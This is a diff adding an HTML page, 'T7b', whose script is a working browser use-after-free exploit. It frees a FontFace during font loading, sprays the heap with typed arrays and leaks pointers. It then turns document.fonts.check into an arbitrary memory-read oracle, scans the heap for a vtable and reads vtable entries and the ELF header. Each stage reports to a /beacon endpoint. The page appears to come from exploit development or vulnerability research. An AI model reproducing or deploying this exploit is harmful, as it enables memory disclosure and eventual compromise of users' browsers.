@@ -1,0 +1,227 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>T7b</title></head>
+<body><pre id="O">T7b</pre>
+<script>
+'use strict';
+function bs(t){try{var x=new XMLHttpRequest();x.open('GET','/beacon/T7b-'+encodeURIComponent(t),false);x.send(null);}catch(e){}}
+bs('BOOT');
+var K=512,SZ=192,fired=false,faces=null,AT=0;
+function le(v,o){var x=0n;for(var k=7;k>=0;k--)x=(x<<8n)|BigInt(v[o+k]);return x;}
+function hex(x){return '0x'+x.toString(16);}
+function put64(u,o,x){for(var k=0;k<8;k++){u[o+k]=Number((x>>BigInt(8*k))&0xFFn);}}
+function put32(u,o,x){u[o]=x&0xFF;u[o+1]=(x>>8)&0xFF;u[o+2]=(x>>16)&0xFF;u[o+3]=(x>>24)&0xFF;}
+
+function start(){
+  AT++;if(AT>1)return;
+  try{if(sessionStorage.getItem('uaf')){bs('DOUBLE');return;}sessionStorage.setItem('uaf','1');}catch(e){}
+  var vf;try{vf=new FontFace('vf','local(Helvetica)',{unicodeRange:'U+0041'});}catch(e){return;}
+  try{document.fonts.add(vf);}catch(e){}
+  try{void vf.loaded;}catch(e){}
+  var fs=document.createElement('style');
+  fs.textContent='@font-face{font-family:v1;src:local(Arial);unicode-range:U+0042;}';
+  document.head.appendChild(fs);
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(fired)return undefined;fired=true;
+    try{fs.remove();}catch(e){}try{document.fonts.delete(this);}catch(e){}
+    try{document.body.offsetHeight;}catch(e){}
+    window.__sp=[];
+    for(var k=0;k<K;k++){
+      var w=new Uint8Array(new ArrayBuffer(SZ));
+      put32(w,0,0x80000000);put32(w,4,0x1000+k);
+      w[0x82]=3;
+      window.__sp.push(w);
+    }
+    return undefined;
+  },set:function(){}});
+  document.fonts.load('1em vf, v1','AB').then(function(f){faces=f;setTimeout(phase,80);},function(){});
+}
+
+function phase(){
+  var bufs=[],L1=0n,L2=0n;
+  for(var i=0;i<window.__sp.length;i++){
+    var a=le(window.__sp[i],0x58);
+    if(a>0x1000000000n){
+      var b2=le(window.__sp[i],0x68);
+      if(L1===0n){L1=a;L2=b2;}
+      bufs.push([window.__sp[i],b2,i]);
+    }
+  }
+  bs('L1='+hex(L1)+'-L2='+hex(L2)+'-bufs='+bufs.length);
+  if(!bufs.length){bs('NOLEAK');return;}
+  var h0=bufs[0][0];
+
+  for(var ib=0;ib<bufs.length;ib++){
+    var vb=bufs[ib][0];
+    vb[0]=2;put64(vb,0x08,bufs[ib][1]);put64(vb,0x10,0n);vb[0x82]=0;
+  }
+  setTimeout(function(){
+    bs('FACES='+faces.length);
+    for(var i2=0;i2<faces.length;i2++){try{faces[i2].family='zz'+i2;}catch(e){}}
+    for(var i3=0;i3<faces.length;i3++){try{document.fonts.add(faces[i3]);}catch(e){}}
+    for(var is2=0;is2<bufs.length;is2++){bufs[is2][0][0x28]=0;bufs[is2][0][0x2C]=0;}
+    setTimeout(function(){
+      var fam=null,zi=-1;
+      for(var q=0;q<faces.length;q++){
+        var r=null;try{r=document.fonts.check('1em zz'+q,'A');}catch(e){r='EX';}
+        if(r===false&&zi<0){fam='zz'+q;zi=q;}
+      }
+      bs('FAM='+fam+'-zi='+zi);
+      if(!fam){bs('NOTIN');return;}
+
+      h0[0x82]=0;put64(h0,0x20,L1);
+      put32(h0,0x28,1);put32(h0,0x2C,1);
+      put32(h0,0x38,0xBEEF);put32(h0,0x3C,0xBF00);
+
+      function setR(addr){put64(h0,0x20,addr);}
+      function chk(c){try{return document.fonts.check('1em '+fam,String.fromCodePoint(c));}catch(e){return 'EX';}}
+
+      bs('SCAN1');
+      var self=0n;
+      for(var sc=0x1000800000n;sc<0x1002800000n&&!self;sc+=0x80n){
+        setR(sc+0x38n);
+        if(chk(0xBEEF)!==true)continue;
+        if(chk(0xBEEE)!==false)continue;
+        setR(sc+0x6Cn);
+        if(chk(0)===false){self=sc;bs('SELF='+hex(sc));}
+      }
+      if(!self){bs('NOSELF');return;}
+
+      // ============================================================
+      // PHASE A: Shifted oracle reads on the hash table at L1-0x10
+      // Read bytes 2-5 of the IM pointer via shifted address
+      // ============================================================
+      bs('PH-A');
+
+      // Helper: binary search for 'from' at current setR address
+      // Returns from value, or -1 if range is empty
+      function bsFrom(lo,hi){
+        if(chk(hi)!==true) return -1;
+        while(lo<hi){
+          var mid=(lo+hi)>>>1;
+          if(chk(mid)===true) hi=mid;
+          else lo=mid+1;
+        }
+        return lo;
+      }
+      // Helper: binary search for 'to' (upper bound)
+      function bsTo(from,hi){
+        var lo=from;
+        while(lo<hi){
+          var mid=(lo+hi+1)>>>1;
+          if(chk(mid)===true) lo=mid;
+          else hi=mid-1;
+        }
+        return lo;
+      }
+
+      // Read at L1-0x10 + shift for shifts 2,3,4
+      var htBase=L1-0x10n;
+      var shiftResults=[];
+      for(var sh=2;sh<=4;sh++){
+        setR(htBase+BigInt(sh));
+        var fr=bsFrom(0,0x10FFFF);
+        var to2=-1;
+        if(fr>=0) to2=bsTo(fr,0x10FFFF);
+        shiftResults.push({shift:sh,from:fr,to:to2});
+        bs('HT-s'+sh+'-from='+(fr>=0?'0x'+fr.toString(16):'-1')+'-to='+(to2>=0?'0x'+to2.toString(16):'-1'));
+      }
+
+      // Also read second word at L1-0x10+8 (potential second bucket entry)
+      for(var sh2=2;sh2<=4;sh2++){
+        setR(htBase+8n+BigInt(sh2));
+        var fr2=bsFrom(0,0x10FFFF);
+        var to3=-1;
+        if(fr2>=0) to3=bsTo(fr2,0x10FFFF);
+        bs('HT2-s'+sh2+'-from='+(fr2>=0?'0x'+fr2.toString(16):'-1')+'-to='+(to3>=0?'0x'+to3.toString(16):'-1'));
+      }
+
+      // ============================================================
+      // PHASE B: VP scan — look for 0x80C6A1B28 in the heap
+      // At addr+2, u32_le should be exactly 0x80C6A (bytes 2-5 of VP)
+      // VP = text_base + 0xC6A1B28 = 0x80C6A1B28
+      // VP bytes LE: [28, 1B, 6A, 0C, 08, 00, 00, 00]
+      // At addr+2: from = u32_le([6A, 0C, 08, 00]) = 0x00080C6A = 527466
+      // ============================================================
+      bs('PH-B-VPSCAN');
+      var VP_SIG=0x80C6A;  // the from value at addr+2 for VP
+      var vpHits=[];
+      // Scan ±512KB from L1, 16-byte aligned
+      var scanLo=L1-0x80000n;
+      var scanHi=L1+0x80000n;
+      var scanCount=0;
+      for(var sa=scanLo;sa<scanHi;sa+=0x10n){
+        scanCount++;
+        setR(sa+2n);
+        if(chk(VP_SIG)!==true) continue;
+        // Potential hit — verify exact boundary
+        if(chk(VP_SIG-1)!==false) continue;
+        // Double check at shift+3
+        setR(sa+3n);
+        var v3=bsFrom(0,0x1FFF);
+        // VP byte 3 = 0x0C, byte 4 = 0x08 → from at +3 = 0x0C + 0x08*256 = 0x080C = 2060
+        if(v3===0x080C){
+          vpHits.push(sa);
+          bs('VP-HIT='+hex(sa));
+          if(vpHits.length>=5) break;
+        }
+      }
+      bs('VPSCAN-done-checked='+scanCount+'-hits='+vpHits.length);
+
+      // ============================================================
+      // PHASE C: If VP hit found, that address is FO (CSSFontFaceSet)
+      // VP is at FO+0x00. Read vtable entries via shifted reads.
+      // ============================================================
+      if(vpHits.length>0){
+        var FO=vpHits[0];
+        bs('FO='+hex(FO));
+        var VP=0x80C6A1B28n;  // confirmed if the scan hit
+
+        // Read first 8 vtable entries via shifted reads at VP+entry*8+2
+        bs('PH-C-VTAB');
+        for(var vi=0;vi<8;vi++){
+          var vtAddr=VP+BigInt(vi*8);
+          setR(vtAddr+2n);
+          var vfr=bsFrom(0,0x10FFFF);
+          var vto=-1;
+          if(vfr>=0) vto=bsTo(vfr,0x10FFFF);
+          // vfr = b2 + b3*256 + 0x80000 for text pointers
+          // So function bytes 2-3 = vfr - 0x80000
+          if(vfr>=0x80000){
+            var fb23=vfr-0x80000;
+            var funcPartial=0x800000000n+BigInt(fb23)*0x10000n;
+            bs('VT'+vi+'='+hex(funcPartial)+'xx-from=0x'+vfr.toString(16));
+          } else {
+            bs('VT'+vi+'=from='+(vfr>=0?'0x'+vfr.toString(16):'-1'));
+          }
+        }
+
+        // Also try to read low bytes of VP entries at shift+0 and shift+1
+        // shift+1: from = b1 + b2*256 + b3*65536 + b4*16M → too big for text ptrs
+        // So just report what we got
+
+        // ELF check at text_base
+        bs('PH-C-ELF');
+        setR(0x800000002n);
+        var elfFr=bsFrom(0,0x10FFFF);
+        bs('ELF-s2-from='+(elfFr>=0?'0x'+elfFr.toString(16):'-1'));
+        // ELF magic: 7f 45 4c 46 02 01 01 00
+        // At +2: from = u32_le([4c,46,02,01]) = 0x0102464c
+        // 0x0102464c = 16,860,748 > 0x10FFFF? YES! Can't read.
+        // At +3: from = u32_le([46,02,01,00]) = 0x00010246 = 66118
+        setR(0x800000003n);
+        var elfFr3=bsFrom(0,0x10FFFF);
+        bs('ELF-s3-from='+(elfFr3>=0?'0x'+elfFr3.toString(16):'-1'));
+        // Expected: 0x10246 = 66118 (confirms ELF header bytes 3-6)
+      }
+
+      // Restore oracle for safety
+      put32(h0,0x38,0xBEEF);put32(h0,0x3C,0xBF00);
+      setR(self+0x38n);
+
+      bs('DONE-vpHits='+vpHits.length);
+      document.getElementById('O').textContent='T7b vpHits='+vpHits.length;
+    },500);
+  },80);
+}
+if(document.readyState==='complete'||document.readyState==='interactive')setTimeout(start,0);
+else document.addEventListener('DOMContentLoaded',start);
+</script></body></html>
